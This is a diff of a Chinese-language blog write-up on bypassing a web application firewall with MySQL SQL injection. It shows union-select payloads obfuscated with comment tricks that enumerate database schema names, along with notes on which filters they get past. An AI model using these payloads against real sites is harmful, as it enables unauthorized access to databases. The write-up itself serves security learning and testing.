@@ -756,13 +756,13 @@ order/**/by 拦截  那么直接往里面添加一些垃圾字符绕过<span ari
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175305155.png" alt="image-20211002175305155"></p>
 <h4 id="5-查询数据库"><a href="#5-查询数据库" class="headerlink" title="5.查询数据库"></a>5.查询数据库</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184648064.png" alt="image-20211002184648064"></p>
 <p>database()被过滤了</p>
-<p>尝试在database/<em>/%-//</em>/()</p>
+<p>尝试在database/<em>/%-//</em>/ ( )</p>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184710516.png" alt="image-20211002184710516"></p>
 <p>绕过了</p>
 <p>除了上面，拓展一个方式</p>
 <p>mysql里面的一个原理：对于正常的闭合都是有头有尾的,但是mysq里面的内联注释可以不用</p>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184741131.png" alt="image-20211002184741131"></p>
-<p>就拿这个来说，正常都是(()),但是这个是(()还是可以正常执行的、</p>
+<p>就拿这个来说，正常都是( ( ) ),但是这个是( ( )还是可以正常执行的</p>
 <h4 id="6-查询其他库名"><a href="#6-查询其他库名" class="headerlink" title="6.查询其他库名"></a>6.查询其他库名</h4><pre><code>-1'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184912204.png" alt="image-20211002184912204"></p>
 <pre><code>-1'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,group_concat(schema_name)/*/%-//*/from/*/%-//*/information_schema.schemata --+  </code></pre><p>还是被拦截了</p>
 <p>单独来测试函数 </p>
